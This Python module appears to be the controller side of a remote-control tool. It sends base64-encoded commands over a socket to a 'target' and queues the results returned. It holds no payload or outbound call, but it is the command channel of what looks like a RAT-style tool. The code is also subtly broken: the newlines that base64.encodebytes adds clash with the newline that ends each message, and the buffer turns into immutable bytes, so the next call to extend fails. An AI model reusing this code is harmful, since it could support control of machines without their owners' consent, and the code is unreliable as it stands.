from . import config
from . import commands
from typing import List
import base64


def send_command_to_target(command: commands.Command, target: config.Target):
    command_parts = [command.command_key]  # type: List[str]
    data = b':'.join([base64.encodebytes(command_part.encode('utf-8')) for command_part in command_parts])
    target.sock.send(data)


def wait_for_commands_from_target(target: config.Target):
    buffer = bytearray()
    while True:
        while True:
            chunk = target.sock.recv(2048)
            buffer.extend(chunk)
            if b'\n' in chunk:
                break

        result_raw = buffer.split(b'\n')[0]
        buffer = b'\n'.join(buffer.split(b'\n')[1::])

        result_parts = [base64.decodebytes(result_part).decode('utf-8') for result_part in result_raw.split(b':')]
        config.queue_results.put((target, result_parts))
